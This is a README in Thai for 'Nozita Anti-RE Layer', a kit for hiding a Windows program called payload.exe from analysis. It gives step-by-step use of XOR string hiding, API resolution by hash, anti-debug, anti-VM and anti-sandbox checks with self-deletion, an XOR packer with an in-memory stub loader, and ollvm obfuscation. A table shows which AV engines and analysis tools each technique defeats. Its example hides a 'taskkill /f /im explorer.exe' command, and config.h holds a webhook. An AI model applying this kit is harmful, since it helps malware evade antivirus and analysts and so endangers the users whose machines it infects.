══════════════════════════════════════════════════════════════
 Nozita Anti-RE Layer — README
══════════════════════════════════════════════════════════════

ไฟล์ในโฟลเดอร์นี้:

  config.h        ← ตั้งค่า webhook/key/ชื่อ (แก้ที่นี่ที่เดียว)
  xorstr.h        ← XOR string encryption (ซ่อน strings จาก binary)
  dynapi.h        ← Dynamic API resolution by hash (ซ่อน import table)
  antidebug.h     ← Anti-debug / Anti-VM / Anti-sandbox checks
  packer.c        ← XOR packer (encrypt exe)
  stub.c          ← Stub loader (decrypt + run in memory)
  build_antire.bat← Build script รวม
  hash_calc.py    ← คำนวณ djb2 hash สำหรับ dynapi.h

══════════════════════════════════════════════════════════════
 วิธีใช้ (ขั้นตอน)
══════════════════════════════════════════════════════════════

1. คำนวณ hash จริงก่อน:
   python3 hash_calc.py
   แล้ว copy ค่า H_xxx ไปวางใน dynapi.h แทน placeholder

2. เพิ่ม header ใน main.c:
   #include "xorstr.h"
   #include "dynapi.h"
   #include "antidebug.h"

3. เพิ่มใน WinMain() บรรทัดแรก:
   AntiAll(1);   // 1 = self-delete ถ้าเจอ debugger/VM
   InitDynAPI(); // โหลด module สำหรับ dynamic API

4. เปลี่ยน string ที่สำคัญให้ใช้ XS():
   // แบบเดิม:
   system("taskkill /f /im explorer.exe");
   // แบบซ่อน:
   XUSE(cmd, "taskkill /f /im explorer.exe", system(cmd));

5. เปลี่ยน API call ที่ใช้บ่อยให้ใช้ DYN_:
   // แบบเดิม:
   HANDLE h = CreateFileA(path, ...);
   // แบบซ่อน:
   HANDLE h = DYN_CreateFileA(path, ...);

6. รัน build_antire.bat (ต้องการ MSVC หรือ clang-cl + ollvm)
   ผลลัพธ์คือ payload.exe ที่:
   - strings ถูก XOR ← strings.exe ไม่เห็น
   - import table ว่าง ← IDA ไม่เห็น API call
   - control flow ถูก flatten (ถ้าใช้ ollvm) ← decompiler อ่านยาก
   - binary ถูก XOR pack ← signature AV เจอยาก
   - anti-debug/VM ← วิเคราะห์ใน sandbox ไม่ได้

══════════════════════════════════════════════════════════════
 ระดับการป้องกัน
══════════════════════════════════════════════════════════════

  เครื่องมือ           ป้องกันได้ด้วย
  ─────────────────────────────────────────────────────────
  strings / FLOSS      xorstr.h
  IDA import view      dynapi.h
  x64dbg / OllyDbg     antidebug.h (timing + PEB + DR)
  Cuckoo / Any.run     antidebug.h (VM + sandbox + uptime)
  Ghidra decompiler    ollvm -fla -bcf
  AV signature         packer.c + stub.c + UPX

══════════════════════════════════════════════════════════════
 หมายเหตุ
══════════════════════════════════════════════════════════════

- FILL: hash ใน dynapi.h และ stub.c ต้องคำนวณจาก hash_calc.py
- FILL: STUB_SZ ใน stub.c ต้องตรงกับ actual size ของ stub.exe
        หา size ด้วย: for %i in (stub.exe) do echo %~zi
        แล้วแทนค่าใน #define STUB_SZ
- ถ้า USE_OLLVM=1 ต้องติดตั้ง obfuscator-llvm ก่อน:
  https://github.com/obfuscator-llvm/obfuscator
